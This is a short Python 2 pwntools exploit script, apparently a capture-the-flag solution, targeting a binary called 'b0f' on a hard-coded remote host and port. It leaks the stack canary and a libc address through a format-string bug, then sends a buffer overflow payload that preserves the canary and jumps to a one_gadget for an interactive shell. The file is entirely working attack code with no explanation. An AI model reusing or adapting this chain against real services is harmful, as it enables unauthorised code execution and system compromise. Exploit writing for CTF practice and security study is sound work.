#!/usr/bin/env python2

from pwn import *

# stack canary is at offset 11 for format string
# It is at offset 24 for buffer overflow

HOST, PORT = '68.183.158.95', 8991
BINARY = './b0f'

elf = ELF(BINARY)
context.arch = 'amd64'

if not args.REMOTE:
	libc = elf.libc
else:
	libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

p = start()

# Leak stack canary
p.sendline('%11$lx-%3$lx')
p.recvline()
leaks = p.recvline()
stack_canary = int(leaks.split('-')[0], 16)
libc.address = int(leaks.split('-')[1][:-1], 16) - 0xf72c0

log.info('canary: ' + hex(stack_canary))
log.info('libc base: ' + hex(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))
one_gadget = libc.address + 0x45216 # 0x4526a, 0xf02a4, 0xf1147

log.info('system: ' + hex(system))
log.info('bin sh: ' + hex(bin_sh))
#log.info('pop rdi: ' + hex(pop_rdi))
log.info('one_gadget: ' + hex(one_gadget))

# Get puts libc address leak
payload = 'A'*24
payload += p64(stack_canary)
payload += 'B'*8 # Overwrite ebp
payload += p64(one_gadget)


p.sendline(payload)

p.interactive()
